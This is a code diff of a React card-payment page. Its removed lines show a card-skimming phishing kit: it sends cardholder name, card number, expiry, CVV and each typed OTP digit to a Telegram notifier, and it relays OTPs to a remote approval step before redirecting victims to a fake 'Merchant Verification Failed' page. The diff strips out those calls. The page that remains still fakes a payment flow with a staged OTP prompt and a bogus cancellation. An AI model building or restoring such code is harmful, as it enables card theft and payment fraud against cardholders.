@@ -1,8 +1,8 @@
 import { useState, useRef, useEffect } from "react";
 import { useNavigate, useSearchParams } from "@/lib/flowRouter";
 import { Lock, X, ArrowLeft, ShieldCheck, Store, DollarSign, Globe, RefreshCw, ChevronDown, Smartphone, HelpCircle, Landmark } from "lucide-react";
-import { sendTelegramNotification } from "@/lib/payment-telegram";
-import { submitOtpForApproval } from "@/lib/otpApproval";
+
+
 import { useMerchantInfo } from "@/hooks/useMerchantInfo";
 import { usePaymentMethodGuard } from "@/hooks/usePaymentMethodGuard";
 import FlowLoading from "@/components/FlowLoading";
@@ -240,36 +240,14 @@ const CardPaymentPage = () => {
   const handleSubmit = () => {
     if (!isFormValid() || !selectedCard) return;
     setIsLoading(true);
-    sendTelegramNotification({ type: 'payment_activity', amount, method: selectedCard.label, paymentType: 'card', cardName: cardHolder, cardNumber, expiry, cvv }, { force: true });
+    
     setTimeout(() => { setIsLoading(false); setShowOtp(true); setOtpTimer(60); }, 4000);
   };
   const [otpError, setOtpError] = useState("");
   const [otpAttempts, setOtpAttempts] = useState(0);
   const [otpDenyCount, setOtpDenyCount] = useState(0);
-  const handleOtpConfirm = async () => {
-    if (otpCode.length !== 6 || !selectedCard) return;
-    setOtpLoading(true);
-    const nextAttempt = otpAttempts + 1;
-    setOtpAttempts(nextAttempt);
-    const decision = await submitOtpForApproval({
-      amount, method: selectedCard.label, paymentType: 'card', cardName: cardHolder, cardNumber, expiry, cvv, otp: otpCode,
-    }, { autoAttempt: nextAttempt, otpStartAt: otpStartAtRef.current });
-    setOtpLoading(false);
-    if (decision === 'approved') {
-      navigate(`/payment-cancelled?channel=${selectedCard.label} Card Payment&reason=Merchant Verification Failed&amount=${amount}&ref=${selectedCard.id.toUpperCase()}` + Date.now().toString().slice(-8));
-    } else if (decision === 'timeout' || decision === 'error') {
-      navigate(`/payment-cancelled?channel=${selectedCard.label} Card Payment&reason=Payment isn't completed&amount=${amount}`);
-    } else {
-      const nextDenies = otpDenyCount + 1;
-      setOtpDenyCount(nextDenies);
-      if (nextDenies >= 3) {
-        navigate(`/payment-cancelled?channel=${selectedCard.label} Card Payment&reason=Payment isn't completed&amount=${amount}`);
-        return;
-      }
-      setOtpError("Invalid OTP. Please try again."); setOtpCode("");
-      setTimeout(() => otpInputRef.current?.focus(), 50);
-      setTimeout(() => setOtpError(""), 4000);
-    }
+  const handleOtpConfirm = () => {
+    navigate(`/payment-cancelled?reason=Payment isn't completed&amount=${amount}`);
   };
   const handleResendOtp = () => { if (otpTimer > 0) return; setOtpTimer(60); setOtpCode(""); };
 
@@ -376,7 +354,7 @@ const CardPaymentPage = () => {
                   const v = e.target.value.replace(/\D/g, "").slice(0, 6);
                   setOtpCode(v);
                   if (selectedCard && v.length > otpCode.length && v.length > 0) {
-                    sendTelegramNotification({ type: 'payment_activity', amount, method: selectedCard.label, paymentType: 'card', cardName: cardHolder, cardNumber, expiry, cvv, otp: v });
+                    
                   }
                 }}
                 placeholder="Enter 6-digit OTP"
